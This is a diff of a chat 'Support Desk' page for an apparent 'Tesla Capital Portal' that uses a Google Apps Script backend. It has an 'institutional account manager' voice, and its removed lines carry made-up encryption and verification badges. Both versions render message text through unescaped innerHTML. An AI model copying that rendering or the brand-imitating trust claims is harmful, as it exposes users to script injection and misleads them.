@@ -6,243 +6,114 @@
     <title>Tesla Capital Portal - Messages</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        ::-webkit-scrollbar { display: none; }
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .chat-bubble { max-width: 80%; padding: 12px 16px; border-radius: 18px; }
     </style>
 </head>
-<body class="text-white min-h-screen pb-36">
+<body class="text-white min-h-screen flex flex-col">
 
-    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d] sticky top-0 z-50">
-        <div class="flex items-center space-x-3">
-            <a href="dashboard.html" class="text-neutral-400 hover:text-white transition-colors">
-                <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path>
-                </svg>
-            </a>
-            <span class="text-lg font-bold tracking-tight">Support Desk</span>
-        </div>
-        <div class="flex items-center space-x-2">
-            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-            <span class="text-[10px] text-neutral-400 font-bold uppercase tracking-wider">Desk Online</span>
-        </div>
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
+        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
+            ‹ Back to Hub
+        </a>
+        <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Support Desk</span>
+        <div class="w-8"></div>
     </header>
 
-    <main id="chatContainer" class="max-w-md mx-auto px-4 mt-4 space-y-4">
-        
-        <div class="bg-[#141414] border border-neutral-800/40 rounded-xl p-3 text-center">
-            <p class="text-[10px] text-neutral-500">
-                Secure Channel Established • End-to-End Ledger Encryption Active
-            </p>
-        </div>
-
-        <div class="flex items-start space-x-3 max-w-[85%]">
-            <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-[#E82127] to-[#901115] flex items-center justify-center text-xs font-bold shrink-0 shadow-md">
-                T
-            </div>
-            <div class="space-y-1">
-                <div class="bg-[#141414] border border-[#222] rounded-2xl rounded-tl-none p-3.5 shadow-md">
-                    <p class="text-xs text-neutral-300 leading-relaxed">
-                        Welcome to the Tesla Capital Portal Support Desk. I am your assigned institutional account manager. How can I assist you with your asset profile today?
-                    </p>
-                </div>
-                <p class="text-[9px] text-neutral-600 pl-1 font-medium">Tesla Support Desk • 10:42 AM</p>
-            </div>
-        </div>
-
-        <div class="flex items-start space-x-3 max-w-[85%]">
-            <div class="w-8 h-8 rounded-xl bg-neutral-900 border border-neutral-800 flex items-center justify-center text-xs font-bold shrink-0 shadow-md text-red-500">
-                🤖
-            </div>
-            <div class="space-y-1">
-                <div class="bg-[#141414] border border-[#222] rounded-2xl rounded-tl-none p-3.5 shadow-md">
-                    <p class="text-xs text-neutral-300 font-medium">
-                        System Notice: Account Authentication Verified successfully.
-                    </p>
-                    <div class="mt-2 p-2 bg-neutral-950/80 rounded-lg border border-neutral-900 flex items-center justify-between">
-                        <span class="text-[10px] text-neutral-500 font-mono">SECURE-ID LOCK</span>
-                        <span class="text-[9px] text-emerald-400 font-bold bg-emerald-950/30 px-1.5 py-0.5 rounded border border-emerald-900/30">PASSED</span>
-                    </div>
-                </div>
-                <p class="text-[9px] text-neutral-600 pl-1 font-medium">Automated Core Network • 10:43 AM</p>
-            </div>
-        </div>
-
-    </main>
-
-    <div class="fixed bottom-24 left-4 right-4 max-w-md mx-auto z-40">
-        <form id="chatForm" onsubmit="event.preventDefault(); handleSendMessage();" class="bg-[#141414]/90 backdrop-blur-md border border-[#222] rounded-2xl p-2 flex items-center space-x-2 shadow-2xl">
-            <input 
-                type="text" 
-                id="messageInput"
-                placeholder="Type secure response..." 
-                class="flex-1 bg-transparent text-sm text-neutral-200 placeholder-neutral-600 px-3 py-2.5 focus:outline-none"
-                autocomplete="off"
-            >
-            <button 
-                type="submit" 
-                class="w-10 h-10 rounded-xl bg-[#E82127] hover:bg-red-600 active:scale-95 flex items-center justify-center transition-all shadow-lg shrink-0"
-            >
-                <svg class="w-4 h-4 text-white transform rotate-90 ml-0.5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
-                </svg>
-            </button>
-        </form>
+    <div id="chatContainer" class="flex-1 p-4 overflow-y-auto space-y-4 bg-[#0a0a0a]">
+        <!-- Messages load here -->
     </div>
 
-    <div class="fixed bottom-4 left-4 right-4 bg-[#141414]/90 backdrop-blur-md border border-[#222] h-16 rounded-2xl shadow-2xl flex items-center justify-between px-2 z-50 max-w-md mx-auto">
-        
-        <a href="dashboard.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Home</span>
-        </a>
-
-        <a href="settings.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
-                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Settings</span>
-        </a>
-
-        <a href="messages.html" class="flex flex-col items-center justify-center flex-1 py-1 text-[#E82127]">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
-            </svg>
-            <span class="absolute top-1 right-5 bg-[#E82127] text-white text-[8px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center border border-[#141414]">3</span>
-            <span class="text-[9px] font-bold mt-1 tracking-tight">Messages</span>
-        </a>
-
-        <a href="about.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">About</span>
-        </a>
-
-        <a href="logout.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-500 hover:text-red-400 transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Exit</span>
-        </a>
-
+    <div class="p-4 border-t border-[#222] bg-[#0d0d0d]">
+        <div class="flex gap-2">
+            <input type="text" id="messageInput" 
+                   placeholder="Type your message to support..." 
+                   class="flex-1 bg-[#1c1c1c] border border-[#333] rounded-2xl px-5 py-3 text-white focus:outline-none focus:border-[#E82127]">
+            <button onclick="sendMessage()" 
+                    class="bg-[#E82127] hover:bg-red-600 px-8 rounded-2xl font-medium transition-colors">
+                Send
+            </button>
+        </div>
     </div>
 
     <script>
-        // Set this configuration to match your internal Google Sheets Apps Script API endpoint configurations
-        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
-        let userId = "";
-        let displayedMessageIds = new Set(); // Prevents layout duplication conflicts during polling updates
+        const API_URL = "https://script.google.com/macros/s/AKfycbxMvLEjQRlW8Gveer2mNJf-bnoFsXLVb0wjNdcGkujWwnLVzTf2iDCQI19yVUTi0rtG5w/exec";
+        const userId = localStorage.getItem("userId");
 
-        document.addEventListener("DOMContentLoaded", () => {
-            userId = localStorage.getItem("userId");
-            if (!userId) {
-                window.location.href = "index.html";
-                return;
-            }
-            
-            // Fire off immediate historical query log, then lock into 4-second checking increments
-            fetchChatHistory();
-            setInterval(fetchChatHistory, 4000);
-        });
-
-        // Appends a styled bubble inside your message content pipeline layout
-        function renderBubble(sender, content, timeString) {
-            const container = document.getElementById("chatContainer");
-            const wrapper = document.createElement("div");
-            
-            if (sender === "user") {
-                wrapper.className = "flex items-start justify-end space-x-3 max-w-[85%] ml-auto";
-                wrapper.innerHTML = `
-                    <div class="space-y-1 text-right">
-                        <div class="bg-[#E82127] rounded-2xl rounded-tr-none p-3.5 shadow-md text-left">
-                            <p class="text-xs text-white leading-relaxed">${content}</p>
-                        </div>
-                        <p class="text-[9px] text-neutral-600 pr-1 font-medium">You • ${timeString}</p>
-                    </div>
-                `;
-            } else {
-                wrapper.className = "flex items-start space-x-3 max-w-[85%]";
-                wrapper.innerHTML = `
-                    <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-[#E82127] to-[#901115] flex items-center justify-center text-xs font-bold shrink-0 shadow-md">T</div>
-                    <div class="space-y-1">
-                        <div class="bg-[#141414] border border-[#222] rounded-2xl rounded-tl-none p-3.5 shadow-md">
-                            <p class="text-xs text-neutral-300 leading-relaxed">${content}</p>
-                        </div>
-                        <p class="text-[9px] text-neutral-600 pl-1 font-medium">Tesla Support Desk • ${timeString}</p>
-                    </div>
-                `;
-            }
-            
-            container.appendChild(wrapper);
-            window.scrollTo(0, document.body.scrollHeight);
+        if (!userId) {
+            window.location.href = "index.html";
         }
 
-        async function handleSendMessage() {
-            const input = document.getElementById("messageInput");
+        async function loadMessages() {
+            const container = document.getElementById('chatContainer');
+            container.innerHTML = '<div class="text-center py-12 text-neutral-500">Loading conversation...</div>';
+
+            try {
+                const res = await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify({ action: "getMessages", userId: userId })
+                });
+                const result = await res.json();
+
+                if (result.status === "success") {
+                    if (result.messages.length === 0) {
+                        container.innerHTML = `
+                            <div class="text-center py-16 text-neutral-500">
+                                <p class="text-2xl mb-2">👋</p>
+                                <p>Welcome to Tesla Capital Support</p>
+                                <p class="text-sm mt-2">Send your first message below</p>
+                            </div>`;
+                    } else {
+                        container.innerHTML = result.messages.map(msg => `
+                            <div class="${msg.from === 'User' ? 'text-right' : 'text-left'}">
+                                <div class="chat-bubble inline-block ${msg.from === 'User' ? 'bg-[#E82127] text-white' : 'bg-[#1f1f1f]'}">
+                                    <p>${msg.message}</p>
+                                    <p class="text-[10px] mt-1 opacity-75">${msg.timestamp}</p>
+                                </div>
+                            </div>
+                        `).join('');
+                    }
+                }
+            } catch (e) {
+                container.innerHTML = '<div class="text-red-400 text-center py-8">Could not load messages</div>';
+            }
+            container.scrollTop = container.scrollHeight;
+        }
+
+        async function sendMessage() {
+            const input = document.getElementById('messageInput');
             const text = input.value.trim();
             if (!text) return;
-            
-            input.value = "";
-            
-            // Format dynamic locale timestamps instantly
-            const now = new Date();
-            const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-            
-            // Visual optimistic rendering for fluid client processing speed
-            renderBubble("user", text, timeString);
-            
-            const payload = {
-                action: "sendMessage",
-                userId: userId,
-                sender: "user",
-                message: text,
-                timestamp: now.toISOString()
-            };
+
+            const btns = document.querySelectorAll('button');
+            btns.forEach(b => b.disabled = true);
 
             try {
                 await fetch(API_URL, {
                     method: "POST",
-                    mode: "cors",
                     headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        action: "submitMessage",
+                        userId: userId,
+                        message: text
+                    })
                 });
-            } catch (err) {
-                console.error("Message backup syncing failed:", err);
+                input.value = '';
+                loadMessages();
+            } catch (e) {
+                alert("Failed to send message");
             }
+
+            btns.forEach(b => b.disabled = false);
         }
 
-        async function fetchChatHistory() {
-            if (!userId) return;
-            
-            try {
-                const target = `${API_URL}?action=getMessages&userId=${encodeURIComponent(userId)}`;
-                const response = await fetch(target, { method: "GET", mode: "cors" });
-                const result = await response.json();
-                
-                if (result && result.status === "success" && Array.isArray(result.messages)) {
-                    result.messages.forEach(msg => {
-                        // Rely on row unique keys or composite matching IDs to stop duplicate appends
-                        const msgKey = msg.id || `${msg.timestamp}_${msg.message}`;
-                        if (!displayedMessageIds.has(msgKey)) {
-                            displayedMessageIds.add(msgKey);
-                            
-                            const msgTime = new Date(msg.timestamp);
-                            const formattedTime = isNaN(msgTime.getTime()) ? "Just Now" : msgTime.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-                            
-                            // Don't duplicate rendering if already put into container view optimistically
-                            if (msg.sender !== "user") {
-                                renderBubble(msg.sender, msg.message, formattedTime);
-                            }
-                        }
-                    });
-                }
-            } catch (err) {
-                console.warn("Unable to reach synchronization server grid:", err);
-            }
-        }
+        // Load messages when page opens
+        loadMessages();
+
+        // Refresh every 8 seconds
+        setInterval(loadMessages, 8000);
     </script>
 </body>
 </html>
+
